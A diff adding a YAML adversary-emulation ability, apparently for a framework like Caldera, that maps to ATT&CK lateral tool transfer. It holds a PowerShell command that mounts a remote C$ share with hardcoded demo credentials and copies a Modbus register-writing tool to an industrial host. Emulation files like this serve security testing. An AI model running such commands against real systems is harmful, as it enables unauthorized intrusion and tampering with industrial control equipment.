@@ -1,0 +1,15 @@
+- id: tx2_lateral_copy_attack_tool
+  name: TX2_Lateral_Copy_Attack_Tool
+  description: Copy modbus_writer.exe to remote host and execute multiple register write commands remotely via PsExec.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1570
+    name: Lateral Tool Transfer
+  platforms:
+    windows:
+      psh:
+        command: |
+          net use \\172.18.24.12\C$ /user:txone tx1otdemo;
+          Copy-Item -Path "C:\Users\Public\modbus_writer.exe" -Destination "\\172.18.24.12\C$\Windows\Temp\" -Force
+        payloads:
+          - modbus_writer.exe
